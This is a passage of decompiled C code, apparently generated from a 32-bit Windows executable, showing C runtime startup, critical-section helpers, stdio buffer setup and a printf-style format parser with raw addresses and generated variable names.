    int32_t result = function_402e8d((int32_t)&g167, (int32_t)&g167, (int32_t)&g167, (int32_t)&g167, (int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x401b9c
    if (a1 != 0) {
        // 0x401bab
        *(int32_t *)a1 = result;
    }
    // 0x401bad
    return result;
}

// Address range: 0x401baf - 0x401c94
int32_t entry_point(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x401bc4
    __writefsdword(0, (int32_t)&v1);
    uint32_t v2 = GetVersion(); // 0x401bd5
    int32_t v3 = v2 / 256 & 255; // 0x401bdd
    g83 = v3;
    int32_t v4 = v2 & 255; // 0x401be7
    g82 = v4;
    g81 = 256 * v4 | v3;
    g80 = v2 / 0x10000;
    if (function_4037db(1) == 0) {
        // 0x401c12
        function_401cc4(28);
        // UNREACHABLE
    }
    // 0x401c1a
    if (function_402dbf() == 0) {
        // 0x401c23
        function_401cc4(16);
        // UNREACHABLE
    }
    // 0x401c2b
    function_40361f(0);
    g163 = GetCommandLineA();
    g75 = (char *)function_4034ed();
    function_4032a0();
    function_4031e7();
    function_402f4f();
    g87 = g86;
    function_402f7c(function_4013c0(g84, g85, g86));
    int32_t v5; // 0x401baf
    return function_40306f(*(int32_t *)*(int32_t *)v5, v5);
}

// Address range: 0x401cc4 - 0x401ce7
int32_t function_401cc4(int32_t a1) {
    // 0x401cc4
    if (g76 != 2) {
        // 0x401ccd
        __FF_MSGBANNER();
    }
    // 0x401cd2
    __NMSG_WRITE(a1);
    ExitProcess(255);
    // UNREACHABLE
}

// Address range: 0x401ce7 - 0x401ce8
int32_t function_401ce7(void) {
    // 0x401ce7
    int32_t result; // 0x401ce7
    return result;
}

// Address range: 0x401ce8 - 0x401d90
int32_t function_401ce8(void) {
    int32_t v1 = g162; // 0x401ce8
    int32_t v2 = 512; // 0x401cf3
    int32_t v3; // 0x401ce8
    if (v1 != 0) {
        // 0x401cfc
        v2 = 20;
        v3 = v1;
        if (v1 < 20) {
            goto lab_0x401d02;
        } else {
            goto lab_0x401d07;
        }
    } else {
        goto lab_0x401d02;
    }
  lab_0x401d02:
    // 0x401d02
    g162 = v2;
    v3 = v2;
    goto lab_0x401d07;
  lab_0x401d07:;
    int32_t v4 = function_403b74(v3, 4); // 0x401d0a
    g160 = v4;
    if (v4 == 0) {
        // 0x401d1a
        g162 = 20;
        int32_t v5 = function_403b74(20, 4); // 0x401d23
        g160 = v5;
        if (v5 == 0) {
            // 0x401d33
            __amsg_exit();
        }
    }
    int32_t v6 = (int32_t)&g14; // 0x401d3d
    int32_t v7 = 0; // 0x401d3d
    *(int32_t *)(g160 + v7) = v6;
    int32_t v8 = v6 + 32; // 0x401d4b
    v6 = v8;
    v7 += 4;
    int32_t v9 = 0; // 0x401d56
    while (v8 < (int32_t)&g20) {
        // 0x401d42
        *(int32_t *)(g160 + v7) = v6;
        v8 = v6 + 32;
        v6 = v8;
        v7 += 4;
        v9 = 0;
    }
    int32_t v10 = &g15;
    int32_t v11 = *(int32_t *)(4 * v9 / 32 + (int32_t)&g153); // 0x401d69
    int32_t result = *(int32_t *)(v11 + 36 * (v9 & 31)); // 0x401d73
    if (result != -1 != result != 0) {
        // 0x401d7f
        *(int32_t *)v10 = -1;
    }
    int32_t v12 = v10 + 32; // 0x401d82
    v9++;
    while (v12 < (int32_t)&g18) {
        // 0x401d5f
        v10 = v12;
        v11 = *(int32_t *)(4 * v9 / 32 + (int32_t)&g153);
        result = *(int32_t *)(v11 + 36 * (v9 & 31));
        if (result != -1 != result != 0) {
            // 0x401d7f
            *(int32_t *)v10 = -1;
        }
        // 0x401d82
        v12 = v10 + 32;
        v9++;
    }
    // 0x401d8e
    return result;
}

// Address range: 0x401d90 - 0x401da4
int32_t function_401d90(void) {
    int32_t result = function_4028e6(); // 0x401d90
    if (g90 == 0) {
        // 0x401da3
        return result;
    }
    // 0x401d9e
    return function_403c01();
}

// Address range: 0x401da4 - 0x401dd3
int32_t function_401da4(uint32_t a1, int32_t a2, int32_t a3) {
    if (a1 < (uint32_t)(int32_t)&g14 || a1 > (uint32_t)(int32_t)&g19) {
        // 0x401dc8
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(a1 + 32));
        return &g167;
    }
    // 0x401db8
    return function_403cab((int32_t)(a1 - (int32_t)&g14) / 32 + 28);
}

// Address range: 0x401dd3 - 0x401df6
int32_t function_401dd3(int32_t a1, int32_t a2) {
    if (a1 <= 19) {
        // 0x401ddc
        return function_403cab(a1 + 28);
    }
    // 0x401de7
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(a2 + 32));
    return &g167;
}

// Address range: 0x401df6 - 0x401e25
int32_t function_401df6(uint32_t a1) {
    if (a1 < (uint32_t)(int32_t)&g14 || a1 > (uint32_t)(int32_t)&g19) {
        // 0x401e1a
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(a1 + 32));
        return &g167;
    }
    // 0x401e0a
    return function_403d0c((int32_t)(a1 - (int32_t)&g14) / 32 + 28);
}

// Address range: 0x401e25 - 0x401e48
int32_t function_401e25(int32_t a1, int32_t a2) {
    if (a1 <= 19) {
        // 0x401e2e
        return function_403d0c(a1 + 28);
    }
    // 0x401e39
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(a2 + 32));
    return &g167;
}

// Address range: 0x401e48 - 0x401ed5
int32_t function_401e48(int32_t a1) {
    // 0x401e48
    int32_t v1; // 0x401e48
    if (function_403dad(*(int32_t *)(a1 + 16), v1) == 0) {
        // 0x401ed1
        return 0;
    }
    int32_t v2 = &g78; // 0x401e60
    if (a1 != (int32_t)&g16) {
        // 0x401e66
        v2 = (int32_t)&g78 + 4;
        if (a1 != (int32_t)&g17) {
            // 0x401ed1
            return 0;
        }
    }
    // 0x401e71
    g77++;
    int16_t * v3 = (int16_t *)(a1 + 12); // 0x401e77
    if ((*v3 & 268) != 0) {
        // 0x401ed1
        return 0;
    }
    int32_t * v4 = (int32_t *)v2; // 0x401e7f
    int32_t v5 = *v4; // 0x401e7f
    int32_t v6 = v5; // 0x401e95
    if (v5 == 0) {
        int32_t * v7 = _malloc(0x1000); // 0x401e98
        v6 = (int32_t)v7;
        *v4 = v6;
        if (v7 == NULL) {
            int32_t v8 = a1 + 20; // 0x401ea4
            *(int32_t *)(a1 + 8) = v8;
            *(int32_t *)a1 = v8;
            *(int32_t *)(a1 + 24) = 2;
            *(int32_t *)(a1 + 4) = 2;
            // 0x401ec4
            *v3 = *v3 | 0x1102;
            return 1;
        }
    }
    // 0x401eb7
    *(int32_t *)(a1 + 24) = 0x1000;
    *(int32_t *)(a1 + 8) = v6;
    *(int32_t *)a1 = v6;
    *(int32_t *)(a1 + 4) = 0x1000;
    // 0x401ec4
    *v3 = *v3 | 0x1102;
    return 1;
}

// Address range: 0x401ed5 - 0x401eff
int32_t function_401ed5(int32_t a1, int32_t a2) {
    // 0x401ed5
    int32_t result; // 0x401ed5
    if (a1 == 0) {
        // 0x401efd
        return result;
    }
    char * v1 = (char *)(a2 + 13); // 0x401ee1
    if ((*v1 & 16) != 0) {
        // 0x401ee7
        int32_t v2; // 0x401ed5
        int32_t v3 = function_40288a(a2, v2); // 0x401ee8
        *v1 = *v1 & -18;
        *(int32_t *)(a2 + 24) = 0;
        *(int32_t *)a2 = 0;
        *(int32_t *)(a2 + 8) = 0;
        result = v3;
    }
    // 0x401efd
    return result;
}

// Address range: 0x401eff - 0x402620
int32_t function_401eff(int32_t a1, int32_t a2, int32_t * a3) {
    int32_t v1 = (int32_t)a3;
    char v2 = *(char *)a2; // 0x401f10
    int32_t result = 0; // bp-24, 0x401f18
    if (v2 == 0) {
        // 0x402618
        return 0;
    }
    int32_t v3 = &v1;
    char v4; // bp-588, 0x401eff
    int32_t v5 = &v4;
    int32_t v6; // bp-76, 0x401eff
    int32_t v7 = &v6;
    int32_t v8 = &result;
    char v9; // bp-26, 0x401eff
    int32_t v10 = &v9;
    int32_t v11; // bp-60, 0x401eff
    int32_t v12 = &v11;
    int32_t v13 = a2; // 0x401eff
    int32_t v14 = 0; // 0x401eff
    int32_t v15; // bp-600, 0x401eff
    int32_t v16 = &v15; // 0x401eff
    char v17 = v2; // 0x40260a
    int32_t v18 = 0; // 0x401eff
    int32_t v19; // 0x401eff
    char v20; // 0x401eff
    int32_t v21; // 0x401eff
    int32_t v22; // 0x401eff
    int32_t v23; // 0x401eff
    char * v24; // 0x401eff
    int32_t v25; // 0x401eff
    char * v26; // 0x401eff
    char ** v27; // 0x401eff
    char ** v28; // 0x401eff
    char ** v29; // 0x401eff
    char ** v30; // 0x401eff
    int32_t v31; // 0x401eff
    int32_t v32; // 0x401eff
    int32_t v33; // 0x401eff
    int32_t v34; // 0x401eff
    int32_t v35; // 0x401eff
    int32_t v36; // 0x401eff
    int32_t v37; // 0x401eff
    int32_t v38; // 0x401eff
    int32_t v39; // 0x401eff
    int32_t v40; // 0x401eff
    int32_t v41; // 0x401eff
    int32_t v42; // 0x401eff
    int32_t v43; // 0x401eff
    int32_t v44; // 0x401eff
    int32_t v45; // 0x401eff
    int32_t v46; // 0x401eff
    int32_t v47; // 0x401eff
    int32_t v48; // 0x401eff
    int32_t v49; // 0x401eff
    int32_t v50; // 0x401eff
    int32_t v51; // 0x401eff
    int32_t v52; // 0x401eff
    int32_t v53; // 0x401eff
    int32_t v54; // 0x401eff
    int32_t v55; // 0x401eff
    int32_t v56; // 0x401eff
    int32_t v57; // 0x401eff
    int32_t v58; // 0x401eff
    int32_t v59; // 0x401eff
    int32_t v60; // 0x401eff
    int32_t v61; // 0x401eff
    int32_t v62; // 0x401eff
    int32_t v63; // 0x401eff
    int32_t v64; // 0x401eff
    int32_t v65; // 0x401eff
    char v66; // 0x401eff
    char v67; // 0x401eff
    char v68; // 0x401eff
    char v69; // 0x401eff
    char v70; // 0x401eff
    char v71; // 0x401eff
    char v72; // 0x401eff
    int16_t v73; // 0x401eff
    int16_t v74; // 0x401eff
    int16_t v75; // 0x401eff
    int16_t v76; // 0x401eff
    int16_t v77; // 0x401eff
    int32_t v78; // 0x401eff
    int32_t v79; // 0x402225
    int32_t * v80; // 0x402225
    while (true) {
      lab_0x401f3c:
        // 0x401f3c
        v31 = v18;
        v35 = v34;
        v62 = v61;
        v53 = v52;
        v46 = v45;
        v41 = v40;
        v74 = v73;
        v49 = v48;
        v67 = v66;
        v28 = v27;
        v57 = v56;
        v20 = v17;
        v22 = v16;
        v25 = v13;
        int32_t v81 = 0; // 0x401f3f
        if (v20 <= 120) {
            char v82 = *(char *)((int32_t)v20 + 0x4080f4); // 0x401f49
            v81 = v82 & 15;
        }
        // 0x401f56
        v19 = v20;
        v24 = (char *)(v25 + 1);
        char v83 = *(char *)(v14 + (int32_t)&g1 + 8 * v81); // 0x401f56
        int32_t v84 = v83 / 16; // 0x401f5e
        g164 = v84;
        v18 = v31;
        v39 = v35;
        v14 = v84;
        v65 = v62;
        v55 = v53;
        v47 = v46;
        v44 = v41;
        v77 = v74;
        v51 = v49;
        v72 = v67;
        v26 = v24;
        v30 = v28;
        v60 = v57;
        v16 = v22;
        switch (v84) {
            case 0: {
                goto lab_0x40209e;
            }
            case 1: {
                // 0x401f74
                v18 = v31;
                v39 = -1;
                v14 = 1;
                v65 = 0;
                v55 = 0;
                v47 = 0;
                v44 = 0;
                v77 = 0;
                v51 = 0;
                v72 = v67;
                v26 = v24;
                v30 = v28;
                v60 = v57;
                v16 = v22;
                goto lab_0x402607;
            }
            case 2: {
                switch (0x1000000 * v19) {
                    case 0x20000000: {
                        // 0x401fd2
                        v18 = v31;
                        v39 = v35;
                        v14 = 2;
                        v65 = v62;
                        v55 = v53;
                        v47 = v46;
                        v44 = v41;
                        v77 = v74 | 2;
                        v51 = v49;
                        v72 = v67;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                        // break -> 0x402607
                        break;
                    }
                    case 0x23000000: {
                        // 0x401fc9
                        v18 = v31;
                        v39 = v35;
                        v14 = 2;
                        v65 = v62;
                        v55 = v53;
                        v47 = v46;
                        v44 = v41;
                        v77 = v74 | -128;
                        v51 = v49;
                        v72 = v67;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                        // break -> 0x402607
                        break;
                    }
                    case 0x2b000000: {
                        // 0x401fc0
                        v18 = v31;
                        v39 = v35;
                        v14 = 2;
                        v65 = v62;
                        v55 = v53;
                        v47 = v46;
                        v44 = v41;
                        v77 = v74 | 1;
                        v51 = v49;
                        v72 = v67;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                        // break -> 0x402607
                        break;
                    }
                    default: {
                        int32_t v85 = (int32_t)v20 - 45; // 0x401fa2
                        if (v85 == 0) {
                            // 0x401fb7
                            v18 = v31;
                            v39 = v35;
                            v14 = 2;
                            v65 = v62;
                            v55 = v53;
                            v47 = v46;
                            v44 = v41;
                            v77 = v74 | 4;
                            v51 = v49;
                            v72 = v67;
                            v26 = v24;
                            v30 = v28;
                            v60 = v57;
                            v16 = v22;
                        } else {
                            // 0x401fa5
                            v18 = v31;
                            v39 = v35;
                            v14 = 2;
                            v65 = v62;
                            v55 = v53;
                            v47 = v46;
                            v44 = v41;
                            v77 = v85 != 3 ? v74 : v74 | 8;
                            v51 = v49;
                            v72 = v67;
                            v26 = v24;
                            v30 = v28;
                            v60 = v57;
                            v16 = v22;
                        }
                        // break -> 0x402607
                        break;
                    }
                }
                goto lab_0x402607;
            }
            case 3: {
                if (v20 != 42) {
                    // 0x402003
                    v18 = v31;
                    v39 = v35;
                    v14 = 3;
                    v65 = v62;
                    v55 = v53;
                    v47 = (int32_t)v20 - 48 + 10 * v46;
                    v44 = v41;
                    v77 = v74;
                    v51 = v49;
                    v72 = v67;
                    v26 = v24;
                    v30 = v28;
                    v60 = v57;
                    v16 = v22;
                } else {
                    // 0x401fe0
                    *(int32_t *)(v22 - 4) = v3;
                    int32_t v86 = function_4026de(3); // 0x401fe4
                    v18 = v31;
                    v39 = v35;
                    v14 = 3;
                    v65 = v62;
                    v55 = v53;
                    v47 = v86;
                    v44 = v41;
                    v77 = v74;
                    v51 = v49;
                    v72 = v67;
                    v26 = v24;
                    v30 = v28;
                    v60 = v57;
                    v16 = v22;
                    if (v86 < 0) {
                        // 0x401ff5
                        v18 = v31;
                        v39 = v35;
                        v14 = 3;
                        v65 = v62;
                        v55 = v53;
                        v47 = -v86;
                        v44 = v41;
                        v77 = v74 | 4;
                        v51 = v49;
                        v72 = v67;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                    }
                }
                goto lab_0x402607;
            }
            case 4: {
                // 0x402012
                v18 = v31;
                v39 = 0;
                v14 = 4;
                v65 = v62;
                v55 = v53;
                v47 = v46;
                v44 = v41;
                v77 = v74;
                v51 = v49;
                v72 = v67;
                v26 = v24;
                v30 = v28;
                v60 = v57;
                v16 = v22;
                goto lab_0x402607;
            }
            case 5: {
                if (v20 != 42) {
                    // 0x40203d
                    v18 = v31;
                    v39 = (int32_t)v20 - 48 + 10 * v35;
                    v14 = 5;
                    v65 = v62;
                    v55 = v53;
                    v47 = v46;
                    v44 = v41;
                    v77 = v74;
                    v51 = v49;
                    v72 = v67;
                    v26 = v24;
                    v30 = v28;
                    v60 = v57;
                    v16 = v22;
                } else {
                    // 0x40201f
                    *(int32_t *)(v22 - 4) = v3;
                    int32_t v87 = function_4026de(5); // 0x402023
                    v18 = v31;
                    v39 = v87 >= 0 ? v87 : -1;
                    v14 = 5;
                    v65 = v62;
                    v55 = v53;
                    v47 = v46;
                    v44 = v41;
                    v77 = v74;
                    v51 = v49;
                    v72 = v67;
                    v26 = v24;
                    v30 = v28;
                    v60 = v57;
                    v16 = v22;
                }
                goto lab_0x402607;
            }
            case 6: {
                switch (v20) {
                    case 73: {
                        // 0x402082
                        if (*v24 != 54) {
                            goto lab_0x40209e;
                        } else {
                            // 0x402087
                            if (*(char *)(v25 + 2) != 52) {
                                goto lab_0x40209e;
                            } else {
                                // 0x40208d
                                v18 = v31;
                                v39 = v35;
                                v14 = 6;
                                v65 = v62;
                                v55 = v53;
                                v47 = v46;
                                v44 = v41;
                                v77 = v74;
                                v51 = v49;
                                v72 = v67 | -128;
                                v26 = (char *)(v25 + 3);
                                v30 = v28;
                                v60 = v57;
                                v16 = v22;
                                goto lab_0x402607;
                            }
                        }
                    }
                    case 104: {
                        // 0x402079
                        v18 = v31;
                        v39 = v35;
                        v14 = 6;
                        v65 = v62;
                        v55 = v53;
                        v47 = v46;
                        v44 = v41;
                        v77 = v74 | 32;
                        v51 = v49;
                        v72 = v67;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                        goto lab_0x402607;
                    }
                    case 108: {
                        // 0x402070
                        v18 = v31;
                        v39 = v35;
                        v14 = 6;
                        v65 = v62;
                        v55 = v53;
                        v47 = v46;
                        v44 = v41;
                        v77 = v74 | 16;
                        v51 = v49;
                        v72 = v67;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                        goto lab_0x402607;
                    }
                    default: {
                        char v88 = v20 != 119 ? v67 : v67 | 8;
                        v18 = v31;
                        v39 = v35;
                        v14 = 6;
                        v65 = v62;
                        v55 = v53;
                        v47 = v46;
                        v44 = v41;
                        v77 = v74;
                        v51 = v49;
                        v72 = v88;
                        v26 = v24;
                        v30 = v28;
                        v60 = v57;
                        v16 = v22;
                        goto lab_0x402607;
                    }
                }
            }
            case 7: {
                int32_t v89 = 0x1000000 * v19;
                if (v89 > 0x67000000) {
                    // 0x40230a
                    v68 = v67;
                    v36 = 8;
                    v78 = 7;
                    v32 = 10;
                    v37 = v35;
                    v42 = v41;
                    v75 = v74;
                    v70 = v67;
                    v58 = v57;
                    switch ((char)((v89 - 0x69000000) / 0x1000000)) {
                        case 0: {
                            goto lab_0x4023e4;
                        }
                        case 5: {
                            // 0x4023ba
                            *(int32_t *)(v22 - 4) = v3;
                            int32_t v90 = function_4026de(7); // 0x4023be
                            if ((v74 & 32) == 0) {
                                // 0x4023d3
                                *(int32_t *)v90 = result;
                                v18 = v31;
                                v39 = v35;
                                v14 = 7;
                                v65 = v62;
                                v55 = 1;
                                v47 = v46;
                                v44 = v41;
                                v77 = v74;
                                v51 = v49;
                                v72 = v67;
                                v26 = v24;
                                v30 = v28;
                                v60 = v57;
                                v16 = v22;
                            } else {
                                // 0x4023ca
                                *(int16_t *)v90 = (int16_t)result;
                                v18 = v31;
                                v39 = v35;
                                v14 = 7;
                                v65 = v62;
                                v55 = 1;
                                v47 = v46;
                                v44 = v41;
                                v77 = v74;
                                v51 = v49;
                                v72 = v67;
                                v26 = v24;
                                v30 = v28;
                                v60 = v57;
                                v16 = v22;
                            }
                            goto lab_0x402607;
                        }
                        case 6: {
                            // 0x4023a7
                            v32 = 8;
                            v37 = v35;
                            v42 = v41;
                            v75 = v74;
                            v70 = (char)(v74 / 64) & 2 | v67;
                            v58 = v57;
                            goto lab_0x4023ef;
                        }
                        case 7: {
                            goto lab_0x402385;
                        }
                        case 10: {
                            goto lab_0x40212c;
                        }
                        case 12: {
                            goto lab_0x4023ef;
                        }
                        default: {
                            // 0x402337
                            v36 = v35;
                            v78 = 39;
                            if (v20 != 120) {
                                goto lab_0x402509;
                            } else {
                                goto lab_0x402385;
                            }
                        }
                    }
                } else {
                    // 0x4020ee
                    v63 = v62;
                    v21 = v19;
                    if (v89 > 0x64000000) {
                        goto lab_0x40218d;
                    } else {
                        int32_t v91 = v20; // 0x4020e2
                        if (v89 > 0x58000000) {
                            if (v20 == 90) {
                                // 0x402222
                                v79 = v22 - 4;
                                v80 = (int32_t *)v79;
                                *v80 = v3;
                                int32_t v92 = function_4026de(7); // 0x402226
                                if (v92 == 0) {
                                    goto lab_0x402263;
                                } else {
                                    int32_t v93 = *(int32_t *)(v92 + 4); // 0x402230
                                    if (v93 == 0) {
                                        goto lab_0x402263;
                                    } else {
                                        if ((v67 & 8) == 0) {
                                            int16_t v94 = *(int16_t *)v92; // 0x40225b
                                            v33 = v94;
                                            v38 = v35;
                                            v64 = v62;
                                            v54 = v53;
                                            v43 = v41;
                                            v76 = v74;
                                            v50 = 0;
                                            v71 = v67;
                                            v29 = (char **)v93;
                                            v59 = v57;
                                            v23 = v22;
                                        } else {
                                            int16_t v95 = *(int16_t *)v92; // 0x40223d
                                            v33 = (int32_t)v95 / 2;
                                            v38 = v35;
                                            v64 = v62;
                                            v54 = v53;
                                            v43 = v41;
                                            v76 = v74;
                                            v50 = 1;
                                            v71 = v67;
                                            v29 = (char **)v93;
                                            v59 = v57;
                                            v23 = v22;
                                        }
                                        goto lab_0x402509;
                                    }
                                }
                            } else {
                                // 0x4021f0
                                v69 = v67;
                                v33 = v31;
                                v38 = v35;
                                v64 = v62;
                                v54 = v53;
                                v43 = v41;
                                v76 = v74;
                                v50 = v49;
                                v71 = v67;
                                v29 = v28;
                                v59 = v57;
                                v23 = v22;
                                switch (v91) {
                                    case 99: {
                                        goto lab_0x4021ba;
                                    }
                                    case 100: {
                                        goto lab_0x4023e4;
                                    }
                                    default: {
                                        goto lab_0x402509;
                                    }
                                }
                            }
                        } else {
                            // 0x402100
                            v36 = v35;
                            v78 = 7;
                            switch (v89) {
                                case 0x58000000: {
                                    goto lab_0x402385;
                                }
                                case 0x43000000: {
                                    char v96 = (v74 & 2096) != 0 ? v67 : v67 | 8;
                                    v69 = v96;
                                    goto lab_0x4021ba;
                                }
                                case 0x45000000: {
                                    // 0x402183
                                    v63 = 1;
                                    v21 = v20 + 32;
                                    goto lab_0x40218d;
                                }
                                default: {
                                    int32_t v97 = v91 - 71; // 0x402114
                                    if (v97 == 0) {
                                        // 0x402183
                                        v63 = 1;
                                        v21 = v20 + 32;
                                        goto lab_0x40218d;
                                    } else {
                                        // 0x402117
                                        v33 = v31;
                                        v38 = v35;
                                        v64 = v62;
                                        v54 = v53;
                                        v43 = v41;
                                        v76 = v74;
                                        v50 = v49;
                                        v71 = v67;
                                        v29 = v28;
                                        v59 = v57;
                                        v23 = v22;
                                        if (v97 != 12) {
                                            goto lab_0x402509;
                                        } else {
                                            char v98 = (v74 & 2096) != 0 ? v67 : v67 | 8;
                                            v68 = v98;
                                            goto lab_0x40212c;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            default: {
                goto lab_0x402607;
            }
        }
    }
  lab_0x402607_2:
    // 0x402618
    return result;
  lab_0x40209e:;
    int32_t * v99 = (int32_t *)(v22 - 4);
    int32_t * v100; // 0x401eff
    int32_t * v101; // 0x401eff
    int32_t v102; // 0x401eff
    char * v103; // 0x401eff
    if (*(char *)(*(int32_t *)0x409818 + (2 * v19 || 1)) > -1) {
        // 0x40209e
        v101 = (int32_t *)(v22 - 12);
        v100 = (int32_t *)(v22 - 8);
        v103 = v24;
        v102 = v19;
    } else {
        // 0x4020b1
        *v99 = v8;
        int32_t * v104 = (int32_t *)(v22 - 8);
        *v104 = a1;
        int32_t * v105 = (int32_t *)(v22 - 12);
        *v105 = (int32_t)v20;
        function_402640(0, (int32_t)&g167, (int32_t)&g167);
        v101 = v105;
        v100 = v104;
        v103 = (char *)(v25 + 2);
        v102 = (int32_t)*v24;
    }
    // 0x4020ca
    *v99 = v8;
    *v100 = a1;
    *v101 = 0x1000000 * v102 / 0x1000000;
    function_402640((int32_t)v103, (int32_t)&g167, (int32_t)&g167);
    v18 = v31;
    v39 = v35;
    v14 = 0;
    v65 = v62;
    v55 = v53;
    v47 = v46;
    v44 = v41;
    v77 = v74;
    v51 = 0;
    v72 = v67;
    v26 = v103;
    v30 = v28;
    v60 = v57;
    v16 = v22;
    goto lab_0x402607;
  lab_0x402607:
    // 0x402607
    v17 = *v26;
    if (v17 == 0) {
        // break -> 0x402607
        goto lab_0x402607_2;
    }
    // 0x401f2b
    v13 = (int32_t)v26;
    v56 = v60;
    v27 = v30;
    v66 = v72;
    v48 = v51;
    v73 = v77;
    v40 = v44;
    v45 = v47;
    v52 = v55;
    v61 = v65;
    v34 = v39;
    if (result < 0) {
        // 0x402618
        return result;
    }
    goto lab_0x401f3c;
  lab_0x4023e4:
    // 0x4023e4
    v32 = 10;
    v37 = v35;
    v42 = v41;
    v75 = v74 | 64;
    v70 = v67;
    v58 = v57;
    goto lab_0x4023ef;
  lab_0x402385:;
    int32_t v198 = v78;
    int32_t v199 = v36;
    v32 = 16;
    v37 = v199;
    v42 = v41;
    v75 = v74;
    v70 = v67;
    v58 = v198;
    if ((char)v74 <= 255) {
        // 0x402392
        v9 = 48;
        v32 = 16;
        v37 = v199;
        v42 = 2;
        v75 = v74;
        v70 = v67;
        v58 = v198;
    }
    goto lab_0x4023ef;
  lab_0x40212c:;
    char v200 = v68;
    int32_t v201 = v35 != -1 ? v35 : 0x7fffffff;
    *(int32_t *)(v22 - 4) = v3;
    int32_t v202 = function_4026de((int32_t)&g167); // 0x40213d
    char ** v203 = (char **)v202; // 0x40214b
    if ((v74 & 2064) == 0) {
        int32_t v204 = *(int32_t *)&g20;
        if (v201 != 0) {
            int32_t v205; // 0x401eff
            while (*(char *)v205 != 0) {
                // 0x40236d
                int32_t v206; // 0x401eff
                int32_t v207 = v206;
                int32_t v208 = v207 - 1;
                int32_t v209; // 0x401eff
                int32_t v210 = v209 + 1; // 0x40236d
                v206 = v208;
                v205 = v210;
                if (v208 == 0) {
                    // break -> 0x402370
                    break;
                }
                v209 = v205;
                char v211 = *(char *)v209; // 0x402368
            }
        }
        // 0x402370
        v33 = 0;
        v38 = v35;
        v64 = v62;
        v54 = v53;
        v43 = v41;
        v76 = v74;
        v50 = v49;
        v71 = v200;
        v29 = v202 != 0 ? v203 : (char **)v204;
        v59 = v57;
        v23 = v22;
    } else {
        int32_t v212 = v202 != 0 ? v202 : (int32_t)g21;
        int32_t v213 = v201; // 0x40216f
        int32_t v214 = v212; // 0x40216f
        int32_t v215 = v212; // 0x40216f
        if (v201 != 0) {
            int32_t v216 = v214;
            v215 = v216;
            while (*(int16_t *)v216 != 0) {
                int32_t v217 = v213 - 1;
                int32_t v218 = v216 + 2; // 0x402180
                v213 = v217;
                v214 = v218;
                v215 = v218;
                if (v217 == 0) {
                    // break -> 0x402349
                    break;
                }
                v216 = v214;
                v215 = v216;
            }
        }
        // 0x402349
        v33 = (v215 - v212) / 2;
        v38 = v35;
        v64 = v62;
        v54 = v53;
        v43 = v41;
        v76 = v74;
        v50 = 1;
        v71 = v200;
        v29 = v202 != 0 ? v203 : (char **)g21;
        v59 = v57;
        v23 = v22;
    }
    goto lab_0x402509;
  lab_0x4023ef:;
    int32_t v106 = v58;
    char v107 = v70;
    int16_t v108 = v75;
    int32_t v109 = v37;
    int32_t v110 = v32;
    int16_t v111; // 0x401eff
    int32_t v112; // 0x401eff
    int32_t v113; // 0x401eff
    int32_t v114; // 0x401eff
    int32_t v115; // 0x401eff
    char v116; // 0x401eff
    int32_t v117; // 0x401eff
    int16_t v118; // 0x401eff
    if (v107 > -1) {
        // 0x402401
        v118 = v108 & 64;
        *(int32_t *)(v22 - 4) = v3;
        int32_t v119 = function_4026de(v110);
        if ((v108 & 32) == 0) {
            // 0x402428
            v112 = v119;
            v116 = v107;
            v115 = v119;
            v117 = 0;
            if (v118 == 0) {
                goto lab_0x402467;
            } else {
                goto lab_0x40241a;
            }
        } else {
            if (v118 == 0) {
                // 0x40241d
                v112 = v119 & 0xffff;
            } else {
                // 0x402411
                v112 = 0x10000 * v119 / 0x10000;
            }
            goto lab_0x40241a;
        }
    } else {
        // 0x4023f5
        *(int32_t *)(v22 - 4) = v3;
        v111 = v108 & 64;
        v113 = function_4026eb(v110);
        v114 = 0;
        goto lab_0x402442;
    }
  lab_0x40218d:;
    int32_t v120 = v21;
    int32_t v121 = 6; // 0x40219c
    if (v35 >= 0) {
        // 0x402271
        v121 = v35;
        if (v35 == 0) {
            // 0x402273
            v121 = v120 != 103 ? v35 : 1;
        }
    }
    int32_t v122 = v1; // 0x40227f
    int32_t v123 = v22 - 4; // 0x402282
    int32_t * v124 = (int32_t *)v123; // 0x402282
    *v124 = v63;
    v1 = v122 + 8;
    *(int32_t *)(v22 - 8) = v121;
    v6 = *(int32_t *)v122;
    *(int32_t *)(v22 - 12) = 0x1000000 * v120 / 0x1000000;
    *(int32_t *)(v22 - 16) = v5;
    *(int32_t *)(v22 - 20) = v7;
    function_406743();
    if ((char)v74 <= -1 && v121 == 0) {
        // 0x4022c3
        *v124 = v5;
        function_406743();
    }
    if ((char)v74 > -1 == v120 == 103) {
        // 0x4022da
        *v124 = v5;
        function_406743();
    }
    // 0x4022e8
    int32_t v125; // bp-587, 0x401eff
    char ** v126 = v4 != 45 ? (char **)&v4 : (char **)&v125;
    *v124 = v4 != 45 ? v5 : (int32_t)&v125;
    int32_t v127 = v121; // 0x4022fe
    int32_t v128 = v63; // 0x4022fe
    int16_t v129 = v74 | 64; // 0x4022fe
    char v130 = v67 | (char)(v4 == 45); // 0x4022fe
    char ** v131 = v126; // 0x4022fe
    int32_t v132 = v123; // 0x4022fe
    goto lab_0x4022ff;
  lab_0x402509:;
    int32_t v133 = v23;
    int32_t v134 = v59;
    char ** v135 = v29;
    char v136 = v71;
    int32_t v137 = v50;
    int16_t v138 = v76;
    int32_t v139 = v43;
    int32_t v140 = v54;
    int32_t v141 = v64;
    int32_t v142 = v38;
    int32_t v143 = v33;
    v18 = v143;
    v39 = v142;
    v14 = 7;
    v65 = v141;
    v55 = v140;
    v47 = v46;
    v44 = v139;
    v77 = v138;
    v51 = v137;
    v72 = v136;
    v26 = v24;
    v30 = v135;
    v60 = v134;
    v16 = v133;
    if (v140 == 0) {
        int32_t v144 = v138; // 0x402513
        int32_t v145 = v139; // 0x402519
        if ((v138 & 64) != 0) {
